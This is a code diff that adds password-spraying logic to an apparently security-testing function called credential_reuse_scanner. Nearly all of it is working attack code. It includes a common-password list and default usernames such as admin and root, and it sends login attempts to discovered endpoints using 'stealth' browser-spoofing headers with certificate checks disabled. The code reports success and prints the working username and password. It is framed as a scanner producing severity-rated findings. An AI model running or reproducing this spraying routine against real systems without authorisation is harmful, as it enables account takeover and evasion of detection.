@@ -97,6 +97,10 @@ def credential_reuse_scanner(url: str, credentials: str = "") -> str:
         "/admin/login", "/admin/auth",
         "/sso/login", "/saml/login",  # SSO/SAML
         "/oauth/login", "/oauth2/login",
+        "/api/v2/auth", "/api/v3/auth",
+        "/auth", "/authenticate",
+        "/token", "/api/token",
+        "/jwt/login", "/jwt/auth",
     ]
 
     for path in auth_paths:
@@ -115,6 +119,138 @@ def credential_reuse_scanner(url: str, credentials: str = "") -> str:
         })
 
     logger.add_log(tool_name, "SUCCESS", f"Found {len(auth_endpoints)} auth endpoints")
+
+    # ── 1b. Password Spray Testing ────────────────────────────────────────────
+    logger.add_log(tool_name, "PROCESSING", "Testing password spray patterns")
+
+    # Common passwords to spray
+    common_passwords = [
+        "password", "Password1", "Password123", "password123",
+        "admin", "admin123", "admin1234", "admin12345",
+        "123456", "12345678", "123456789", "1234567890",
+        "qwerty", "qwerty123", "abc123", "letmein",
+        "welcome", "welcome1", "welcome123",
+        "monkey", "dragon", "master", "login",
+        "changeme", "default", "test", "test123",
+    ]
+
+    # Common usernames to spray with provided password
+    common_usernames = [
+        "admin", "administrator", "root", "user", "test",
+        "guest", "support", "info", "webmaster", "admin@",
+    ]
+
+    spray_results = []
+
+    # Test common passwords with provided username
+    for spray_pass in common_passwords[:10]:  # Limit to top 10
+        if check_cancelled(logger): break
+        for endpoint in auth_endpoints[:3]:  # Limit to top 3 endpoints
+            try:
+                rate_limiter.wait(domain)
+                # Try different auth methods
+                auth_methods = [
+                    {"method": "POST", "data": {"username": username, "password": spray_pass}},
+                    {"method": "POST", "json": {"username": username, "password": spray_pass}},
+                    {"method": "POST", "data": {"email": username, "password": spray_pass}},
+                ]
+
+                for auth_method in auth_methods:
+                    try:
+                        method = auth_method.pop("method")
+                        resp = requests.request(
+                            method, endpoint,
+                            headers=stealth.get_browser_headers(endpoint),
+                            timeout=3, verify=False, **auth_method, **auth_kwargs,
+                        )
+
+                        if resp.status_code in [200, 201, 302]:
+                            success_indicators = ["dashboard", "welcome", "logout", "profile"]
+                            error_indicators = ["invalid", "incorrect", "wrong", "failed"]
+                            has_success = any(ind in resp.text.lower() for ind in success_indicators)
+                            has_error = any(ind in resp.text.lower() for ind in error_indicators)
+
+                            if has_success and not has_error:
+                                spray_results.append({
+                                    "endpoint": endpoint,
+                                    "username": username,
+                                    "password": spray_pass,
+                                    "method": method,
+                                })
+                                break
+                    except Exception:
+                        continue
+            except Exception:
+                pass
+
+    if spray_results:
+        findings.append({
+            "type": "Password Spray Success",
+            "severity": "Critical",
+            "detail": f"Common password '{spray_results[0]['password']}' works for user '{username}'",
+            "successful_endpoints": [r["endpoint"] for r in spray_results],
+            "evidence": f"Found {len(spray_results)} successful logins with common passwords",
+        })
+        logger.add_log(tool_name, "WARNING", f"Password spray success: {username}:{spray_results[0]['password']}")
+
+    # Test provided password with common usernames
+    for spray_user in common_usernames:
+        if check_cancelled(logger): break
+        for endpoint in auth_endpoints[:3]:
+            try:
+                rate_limiter.wait(domain)
+                auth_methods = [
+                    {"method": "POST", "data": {"username": spray_user, "password": password}},
+                    {"method": "POST", "json": {"username": spray_user, "password": password}},
+                    {"method": "POST", "data": {"email": spray_user, "password": password}},
+                ]
+
+                for auth_method in auth_methods:
+                    try:
+                        method = auth_method.pop("method")
+                        resp = requests.request(
+                            method, endpoint,
+                            headers=stealth.get_browser_headers(endpoint),
+                            timeout=3, verify=False, **auth_method, **auth_kwargs,
+                        )
+
+                        if resp.status_code in [200, 201, 302]:
+                            success_indicators = ["dashboard", "welcome", "logout", "profile"]
+                            error_indicators = ["invalid", "incorrect", "wrong", "failed"]
+                            has_success = any(ind in resp.text.lower() for ind in success_indicators)
+                            has_error = any(ind in resp.text.lower() for ind in error_indicators)
+
+                            if has_success and not has_error:
+                                spray_results.append({
+                                    "endpoint": endpoint,
+                                    "username": spray_user,
+                                    "password": password,
+                                    "method": method,
+                                })
+                                break
+                    except Exception:
+                        continue
+            except Exception:
+                pass
+
+    # Deduplicate spray results
+    unique_spray = []
+    seen_keys = set()
+    for r in spray_results:
+        key = (r["endpoint"], r["username"], r["password"])
+        if key not in seen_keys:
+            seen_keys.add(key)
+            unique_spray.append(r)
+
+    if unique_spray and not any(f["type"] == "Password Spray Success" for f in findings):
+        findings.append({
+            "type": "Password Spray Success",
+            "severity": "Critical",
+            "detail": f"Password works for multiple common usernames",
+            "successful_logins": unique_spray[:5],
+            "evidence": f"Found {len(unique_spray)} successful logins with password spray",
+        })
+        logger.add_log(tool_name, "WARNING", f"Password spray success: {len(unique_spray)} logins")
 
     # ── 2. Test credentials on each endpoint ──────────────────────────────────
     logger.add_log(tool_name, "PROCESSING", f"Testing credentials on {len(auth_endpoints)} endpoints")
